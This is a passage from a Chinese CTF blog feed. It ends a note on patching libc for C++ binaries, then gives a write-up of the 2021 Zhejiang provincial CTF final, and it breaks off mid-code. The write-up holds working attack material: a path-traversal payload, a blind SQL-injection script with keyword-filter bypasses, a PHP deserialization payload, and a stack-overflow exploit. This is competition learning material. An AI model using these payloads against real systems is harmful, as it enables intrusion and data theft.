class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C++</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Hello world&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†åˆ«ç”¨gccå’Œg++å‘½ä»¤ç¼–è¯‘å¾—åˆ°1å’Œ2å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>æŸ¥çœ‹åŠ¨æ€é“¾æ¥çš„å…³ç³»ã€‚</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/3.png" alt="3"></p><p>å¯ä»¥çœ‹åˆ°C++ç¨‹åºå¤šäº†ä¸‰é¡¹ä¾èµ–ï¼ŒæŸ¥ä¸€ä¸‹è‡ªå·±glibc all in one libsä¸­æ‰¾å¾—åˆ°ä¸€ä¸‹ä¾èµ–é¡¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc.so.6</span><br><span class="line">libm.so.6</span><br><span class="line">ld.so.6</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¢åº“çš„åŸå› æ˜¯å› ä¸ºmallocçš„åˆ†é…ä»¥åŠå„ä¸ªå‡½æ•°åœ¨libcä¸­çš„åç§»åœ¨ä¸åŒç‰ˆæœ¬ä¸­éƒ½æœ‰ç€å¾ˆå¤§çš„åŒºåˆ«ï¼Œåç§»é—®é¢˜ä¸å¤§ï¼Œåªéœ€è¦åœ¨æœ¬åœ°æ‰“å‡ºä¹‹åè¿æ¥è¿œç¨‹é¶æœºçš„æ—¶å€™æ›¿æ¢ä¸€ä¸‹è‡ªå·±çš„libcå³å¯ã€‚ä½†æ˜¯åœ¨æ‰“å †é¢˜çš„æ—¶å€™ï¼Œä¸åŒlibcåˆ†é…æœ‰æœ¬è´¨åŒºåˆ«ï¼Œæ¯”å¦‚ï¼Œ2.27çš„tcacheå…è®¸ç›´æ¥double freeï¼Œä½†æ˜¯2.23å’Œ2.29ä¹‹åéƒ½ä¸å…è®¸ç›´æ¥çš„double freeã€‚ä»¥åŠ2.34 çš„libc ä¸­å¾ˆå¤šhookå·²ç»è¢«åˆ é™¤ï¼Œå¹¶ä¸èƒ½åˆ©ç”¨ã€‚æ€»ä¹‹ï¼Œåœ¨æ‰“å †é¢˜çš„æ—¶å€™ç‰ˆæœ¬æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ä¸œè¥¿ï¼Œä¸åŒç‰ˆæœ¬åˆ©ç”¨æ‰‹æ®µéƒ½ä¼šæœ‰æœ¬è´¨åŒºåˆ«çš„ã€‚</p><p>æˆ‘ä»¬patchelfçš„æ—¶å€™ä¸€èˆ¬æ˜¯æŒ‡å®šé“¾æ¥å™¨ï¼Œç„¶åå†æŒ‡å®šrunpathåˆ°æˆ‘ä»¬è‡ªå·±ä¸‹è½½çš„åº“æ–‡ä»¶ã€‚é‚£æˆ‘ä»¬æŠŠè¿™ä¸¤ä¸ªé¡¹æ¢ä¸Š2.23çš„libcä¹‹ålddçœ‹çœ‹ä»–ä»¬çš„ä¾èµ–å…³ç³»ã€‚</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/4.png" alt="2"></p><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶éƒ½å·²ç»æ¢ä¸Šäº†2.23ç‰ˆæœ¬çš„libcï¼Œä½†æ˜¯C++ç¼–è¯‘å‡ºæ¥çš„æ–‡ä»¶å‡ºç°äº†æŠ¥é”™ï¼ŒæŠ¥é”™æ˜¯åœ¨æˆ‘ä»¬æ¢ä¸Šçš„libc.so.6ä¸­æŠ¥å‡ºçš„ï¼Œç„¶åæŠ¥é”™çš„æé†’æ˜¯å› ä¸ºè¿™ä¸ªlibstdc++.so.6ã€‚é‚£ä¹ˆå°±å¯ä»¥ç¡®å®šä¸€ç‚¹äº†ï¼Œc++è‡ªå·±é¢å¤–æä¾›äº†åº“ï¼Œè€Œè¿™ä¸ªåº“æ˜¯libstdc++.so.6ï¼Œè€Œè¿™ä¸€é¡¹æŒ‡å®šåˆ°äº†æˆ‘ä»¬ç³»ç»Ÿçš„/lib/x86_64-linux-gnu/libstdc++.so.6è¿™ä¸ªåº“æ–‡ä»¶ä¸­ï¼Œè€Œè¿™ä¸ªåº“æ–‡ä»¶æ˜¯å¯¹åº”äº†æˆ‘ä»¬å®‰è£…çš„ç‰ˆæœ¬çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å»æ‰¾ä¸€æ‰¾2.23ç‰ˆæœ¬çš„è¿™ä¸ªC++çš„åº“ï¼Œå¹¶ä¸”patchä¹‹åæŒ‡å‘é‚£ä¸ªåº“åº”è¯¥å°±å¯ä»¥è§£å†³ã€‚è¿™é‡Œå¯ä»¥å­¦è‚¥çŒ«å¸ˆå‚…çš„åšæ³•ï¼Œå…ˆç”¨dockerè£…ä¸€ä¸ª16ç‰ˆæœ¬çš„ubuntuï¼Œå› ä¸º16ç‰ˆæœ¬åˆšå¥½å¯¹åº”äº†libcçš„ç‰ˆæœ¬2.23ã€‚</p><p>è¿™é‡Œå…ˆå»ç”¨dockeræ‹‰ä¸€ä¸ªubuntu16.04çš„é•œåƒç„¶åç”¨å¦‚ä¸‹å‘½ä»¤è¿›å…¥è¿™ä¸ªé•œåƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#docker run -it ubuntu:16.04 /bin/bash</span><br></pre></td></tr></table></figure><p>è¿›å…¥ä¹‹åè£…ä¸Šg++å’Œvimï¼Œç”¨vimå†™ä¸€ä¸ªhello world å¹¶ä¸”ç¼–è¯‘ä¹‹ålddæŸ¥çœ‹æ–‡ä»¶ä¾èµ–å…³ç³»ï¼Œæ‰¾åˆ°libstdc++.so.6æŒ‡å‘çš„å…·ä½“è·¯å¾„ç„¶åç”¨docker cpå‘½ä»¤æ‹·è´åˆ°è‡ªå·±ç›®å½•ä¸‹ï¼Œç„¶åå»ºè®®ä¸¢è¿›libsç›®å½•ï¼Œæ­¤æ—¶ä¸ºC++æ–‡ä»¶å†åŠ ä¸€ä¸ªpatchelfå‘½ä»¤ï¼Œæˆ‘è¿™é‡Œç”¨äº†å¦‚ä¸‹å‘½ä»¤ï¼Œè‡ªå·±çœ‹æƒ…å†µæ”¹æ”¹è·¯å¾„å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$patchelf --replace-needed libstdc++.so.6 &#x27;/home/xiaoji233/pwn-tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libstdc++.so.6.0.21&#x27;  filename</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œæ”¹å®Œäº†ä¹‹åæˆ‘ä»¬lddçœ‹çœ‹æƒ…å†µã€‚</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/5.png" alt="5"></p><p>å¯ä»¥çœ‹åˆ°libstdc++.so.6å·²ç»æŒ‡å‘äº†æˆ‘ä»¬æ‰€ç»™çš„åº“ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰ä¸Šé¢ä¸¤è¡Œçš„æŠ¥é”™äº†ï¼Œå› æ­¤è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªC++ç¨‹åºçš„ç‰ˆæœ¬æ›´æ¢ã€‚</p><p>æœ€åæˆ‘ä»¬è¿è¡Œçœ‹çœ‹ã€‚</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/6.png" alt="6"></p><p>å®Œç¾æˆåŠŸè¿è¡Œã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å°æ€»ç»“ä¸€æ³¢ï¼šåœ¨æ›´æ¢Cç¨‹åºçš„æ—¶å€™éœ€è¦ç”¨patchelfæ›´æ”¹é“¾æ¥å™¨çš„ç‰ˆæœ¬å’Œrunpathï¼ŒC++ç¨‹åºæ¢libcç‰ˆæœ¬çš„æ—¶å€™éœ€è¦é¢å¤–æŒ‡å®šä¸€ä¸ªlibstdc++.so.6è¿™ä¸ªåº“æ‰èƒ½æ­£å¸¸è¿è¡Œã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œè§£å†³è¿™ä¸ªé—®é¢˜å¿ƒæƒ…ååˆ†çˆ½å¿«ï¼Œä¹Ÿå¸Œæœ›æœ¬ç¯‡åšå®¢èƒ½å¸®åˆ°å¾ˆå¤šäººã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021æµ™æ±Ÿçœå†³èµ›</title>
      <link href="/2021/10/31/zjctf2021%20%E5%86%B3%E8%B5%9B/"/>
      <url>/2021/10/31/zjctf2021%20%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ¬¡æ¯”èµ›æœ€ç»ˆrank21ï¼Œå¹¸è€Œæ‹¿åˆ°çœèµ›ä¸€ç­‰å¥–æœ€åä¸€åã€‚pwné¢˜ç­¾åˆ°æ‹¿ä¸‹äºŒè¡€ï¼Œreç­¾åˆ°æ‹¿ä¸‹è¿˜æ˜¯å¥½çš„ï¼Œä½†æ˜¯pwnå°‘æ‹¿äº†ä¸€é“æœ‰ç‚¹å¯æƒœã€‚æœ€ç»ˆè¿˜æ˜¯é å­¦é•¿ak webæ‰æ‹¿ä¸‹çš„çœä¸€ï¼Œå¸Œæœ›å­¦é•¿æ˜å¹´è¿˜èƒ½å¸¦æˆ‘ã€‚ä¸‹é¢æ”¾å‡ºæœ¬æ¬¡æ¯”èµ›æäº¤çš„wpï¼Œmiscå’Œcryå› ä¸ºæ²¡æœ‰ç•™ä¸‹å›¾ç‰‡(å°±æ˜¯wpså¤åˆ¶è¿‡æ¥çš„ï¼Œå¯¼å‡ºpdfä¹‹åäº¤äº†ï¼Œåé¢wordåˆ äº†å›¾ç‰‡ä¹Ÿå°±æ²¡äº†)ã€‚</p><span id="more"></span><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="è¿œå¤ç‰¹æ€§"><a href="#è¿œå¤ç‰¹æ€§" class="headerlink" title="è¿œå¤ç‰¹æ€§"></a>è¿œå¤ç‰¹æ€§</h4><p>æ¢è¡Œç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint/hint.txt%0a../../../../../../flag</span><br></pre></td></tr></table></figure><h4 id="just-login"><a href="#just-login" class="headerlink" title="just login"></a>just login</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://8fd95e2e-9d91-45b1-8ba9-d41be0125b3f.zj-ctf.dasctf.com:80/login&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">data = &#123;&quot;username&quot;: &quot;123&#x27; oorr 1=1 -- &quot;, &quot;password&quot;: &quot;1&quot;&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        data[</span><br><span class="line">            &#x27;username&#x27;] = &quot;1&#x27; oorr substr((sselectelect grogroupup_coonncat(username) frfromom users),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27; -- &quot;.format(</span><br><span class="line">            i, chr(mid))</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Failed&#x27; in res.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    if mid == 32 or mid == 127:</span><br><span class="line">        break</span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·‘è·‘è„šæœ¬å®Œäº‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://8fd95e2e-9d91-45b1-8ba9-d41be0125b3f.zj-ctf.dasctf.com:80/login&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">data = &#123;&quot;username&quot;: &quot;123&#x27; oorr 1=1 -- &quot;, &quot;password&quot;: &quot;1&quot;&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    low = 1</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        data[</span><br><span class="line">            &#x27;username&#x27;] = &quot;1&#x27; oorr substr((sselectelect grgroupoup_coonncat(sql) frfromom sqlite_maasster),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27; -- &quot;.format(</span><br><span class="line">            i, chr(mid))</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Failed&#x27; in res.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    # if mid == 32 or mid == 127:</span><br><span class="line">    #     break</span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(&#x27;\n&#x27; + bytes.fromhex(flag).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h4><p>popé“¾æ˜¯<code>Test::getFlag()&lt;- Fun:__call() &lt;- A:__get() &lt;- B:__destruct()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="keyword">array</span>(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getFlag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> Fun();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="string">&#x27;aaa&#x27;</span>;<span class="comment">//ä¼ ç»™__getçš„å‚æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  Test::getFlag()&lt;- Fun:__call() &lt;- A:__get() &lt;- B:__destruct()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨PHP Bug 72663æ¥ç»•è¿‡__wakeupã€‚è™½ç„¶ç‰ˆæœ¬æ˜¯å¤§äº7.0.10ï¼Œä½†è¿˜æ˜¯å¯ä»¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p><p>æŠŠpayloadçš„å¯¹è±¡æ•°æ”¹ä¸€ä¸‹ï¼Œæ”¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:3:&#123;s:1:&quot;p&quot;;s:3:&quot;aaa&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;s:4:&quot;Test&quot;;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‰“å…¥ï¼Œç»“æŸã€‚</p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>strcat æ ˆæº¢å‡ºï¼Œåˆ©ç”¨å·²ç»æœ‰çš„åé—¨cat flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">def conn(x,file_name):</span><br><span class="line">    if x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-64.so&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        p=remote(&#x27;89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com&#x27;,54500)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-buu64.so&#x27;)</span><br><span class="line">    return ELF(file_name),libc,p</span><br><span class="line">elf,libc,p=conn(0,&#x27;./sai_easy_pwn&#x27;)</span><br><span class="line"></span><br><span class="line">shell=0x40098e</span><br><span class="line">username=b&#x27;a&#x27;*0x30</span><br><span class="line">pwd=b&#x27;a&#x27;*24+p64(shell)</span><br><span class="line"></span><br><span class="line">p.sendafter(b&#x27;username:&#x27;,username)</span><br><span class="line">p.sendafter(b&#x27;password&#x27;,pwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="æœ€ç®€å•çš„é€†å‘"><a href="#æœ€ç®€å•çš„é€†å‘" class="headerlink" title="æœ€ç®€å•çš„é€†å‘"></a>æœ€ç®€å•çš„é€†å‘</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">unsigned char enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  0x76, 0x73, 0x85, 0x75, 0x86, 0x78, 0xAD, 0x6B, 0x97, 0x68, </span><br><span class="line">  0x98, 0x67, 0x64, 0x64, 0x62, 0x97, 0x68, 0x98, 0x6B, 0x6B, </span><br><span class="line">  0x96, 0x67, 0x62, 0x69, 0x95, 0x96, 0x65, 0x96, 0x6A, 0x69, </span><br><span class="line">  0x69, 0x65, 0x66, 0x97, 0x68, 0x98, 0x6A, 0x95, 0x68, 0xAF, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    for (int i = 0; i &lt;= 39; ++i )&#123;</span><br><span class="line">        enc[i]-=50;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%s&quot;,enc);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="decode-and-decode"><a href="#decode-and-decode" class="headerlink" title="decode_and_decode"></a>decode_and_decode</h4><p>åˆ©ç”¨å·¥å…·ç›´æ¥è§£</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="asoul-lover"><a href="#asoul-lover" class="headerlink" title="asoul_lover"></a>asoul_lover</h4><p>ç»“åˆé¢˜ç›®æè¿°åŠpdfä¿¡æ¯æœé›†ï¼Œå‹ç¼©åŒ…å¯†ç ç›´æ¥è§£</p><h4 id="site-log"><a href="#site-log" class="headerlink" title="site_log"></a>site_log</h4><p>æŸ¥çœ‹logï¼Œåœ¨evil.phpæ‰€æœ‰ä¸€äº›å‘½ä»¤ã€‚è·‘è„šæœ¬è·‘å‡ºæ‰€æœ‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;my_site.log&#x27;</span></span><br><span class="line">p = <span class="string">&#x27;vil.php\?attack=(.*) HTTP/1.1&#x27;</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = f.readline()</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            out = re.findall(p, data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> out:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s.append(out[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        f.write(<span class="built_in">str</span>(i + <span class="string">&quot;\n&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åæ‰“å°çœ‹çœ‹å“ªäº›æœ‰ç”¨çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">115</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">100</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">47</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">115</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">119</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">109</span>), <span class="built_in">chr</span>(<span class="number">105</span>)</span><br><span class="line">      , <span 